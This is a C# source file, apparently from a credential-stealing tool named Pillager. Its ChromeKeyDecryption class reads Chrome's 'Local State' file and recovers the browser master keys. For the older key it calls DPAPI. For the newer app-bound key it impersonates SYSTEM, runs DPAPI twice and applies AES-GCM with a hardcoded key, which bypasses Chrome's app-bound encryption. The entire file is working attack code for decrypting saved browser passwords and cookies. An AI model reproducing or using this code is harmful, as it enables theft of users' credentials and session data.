using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.RegularExpressions;

namespace Pillager.Helper
{
    public struct MasterKey
    {
        public byte[] MasterKey_v10;
        public byte[] MasterKey_v20;
    }

    internal class ChromeKeyDecryption
    {
        [DllImport("crypt32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        private static extern bool CryptUnprotectData(
            ref DATA_BLOB pDataIn,
            string szDataDescr,
            IntPtr pOptionalEntropy,
            IntPtr pvReserved,
            IntPtr pPromptStruct,
            int dwFlags,
            ref DATA_BLOB pDataOut);

        [StructLayout(LayoutKind.Sequential)]
        private struct DATA_BLOB
        {
            public int cbData;
            public IntPtr pbData;
        }

        public static MasterKey GetChromeMasterKey(string dirPath)
        {
            string filePath = Path.Combine(dirPath, "Local State");
            if (!File.Exists(filePath))
                return new MasterKey();
            string content = File.ReadAllText(filePath);
            byte[] masterKeyV10 = null, masterKeyV20 = null;

            if (!string.IsNullOrEmpty(content))
            {
                var matchV10 = FindEncryptedKey(content, "\"encrypted_key\":\"(.*?)\"");
                if (matchV10.Count > 0)
                {
                    try
                    {
                        byte[] key = Convert.FromBase64String(matchV10[0]);
                        key = key.Skip(5).ToArray();
                        masterKeyV10 = DPAPIDecrypt(key);
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine("[-] Error: " + ex.Message);
                    }
                }

                var matchV20 = FindEncryptedKey(content, "\"app_bound_encrypted_key\":\"(.*?)\"");
                if (matchV20.Count > 0)
                {
                    byte[] key = Convert.FromBase64String(matchV20[0]);
                    key = key.Skip(4).ToArray();
                    byte[] decryptedKey = DoubleStepDPAPIDecrypt(key);
                    if (decryptedKey != null && decryptedKey.Length > 0)
                    {
                        decryptedKey = decryptedKey.Skip(decryptedKey.Length - 61).ToArray();
                        byte[] iv = decryptedKey.Skip(1).Take(12).ToArray();
                        byte[] ciphertext = decryptedKey.Skip(13).ToArray();
                        byte[] tag = decryptedKey.Skip(45).ToArray();

                        byte[] aesKey = {
                    0xB3, 0x1C, 0x6E, 0x24, 0x1A, 0xC8, 0x46, 0x72, 0x8D, 0xA9, 0xC1, 0xFA, 0xC4, 0x93, 0x66, 0x51,
                    0xCF, 0xFB, 0x94, 0x4D, 0x14, 0x3A, 0xB8, 0x16, 0x27, 0x6B, 0xCC, 0x6D, 0xA0, 0x28, 0x47, 0x87
                    };
                        try
                        {
                            AesGcm aes = new AesGcm();
                            byte[] encryptedData = new byte[ciphertext.Length - tag.Length];
                            Array.Copy(ciphertext, 0, encryptedData, 0, encryptedData.Length);
                            masterKeyV20 = aes.Decrypt(aesKey, iv, null, encryptedData, tag);
                        }
                        catch (Exception)
                        {
                            masterKeyV20 = decryptedKey.Skip(decryptedKey.Length - 32).ToArray();
                        }
                    }
                }
            }
            return new MasterKey
            {
                MasterKey_v10 = masterKeyV10,
                MasterKey_v20 = masterKeyV20,
            };
        }

        private static List<string> FindEncryptedKey(string content, string pattern)
        {
            var matches = Regex.Matches(content, pattern);
            var result = new List<string>();
            foreach (Match match in matches)
            {
                if (match.Groups.Count > 1)
                    result.Add(match.Groups[1].Value);
            }
            return result;
        }


        private static byte[] DPAPIDecrypt(byte[] encryptedBytes)
        {
            DATA_BLOB inputBlob = new DATA_BLOB();
            DATA_BLOB outputBlob = new DATA_BLOB();

            inputBlob.pbData = Marshal.AllocHGlobal(encryptedBytes.Length);
            inputBlob.cbData = encryptedBytes.Length;
            Marshal.Copy(encryptedBytes, 0, inputBlob.pbData, encryptedBytes.Length);

            try
            {
                if (CryptUnprotectData(ref inputBlob, null, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, 0, ref outputBlob))
                {
                    byte[] decryptedBytes = new byte[outputBlob.cbData];
                    Marshal.Copy(outputBlob.pbData, decryptedBytes, 0, outputBlob.cbData);
                    return decryptedBytes;
                }
                else
                {
                    return null;
                }
            }
            finally
            {
                Marshal.FreeHGlobal(inputBlob.pbData);
                Marshal.FreeHGlobal(outputBlob.pbData);
            }
        }

        private static byte[] DoubleStepDPAPIDecrypt(byte[] encryptedData)
        {
            if (!Impersonator.GetSystemPrivileges())
            {
                return null;
            }
            byte[] intermediateData = DPAPIDecrypt(encryptedData);

            Impersonator.RevertToSelf();

            if (intermediateData.Length > 0)
            {
                var encryptedKey = DPAPIDecrypt(intermediateData);
                return encryptedKey;
            }
            else
            {
                Console.WriteLine("[-] First step decryption failed.");
                return null;
            }
        }
    }
}
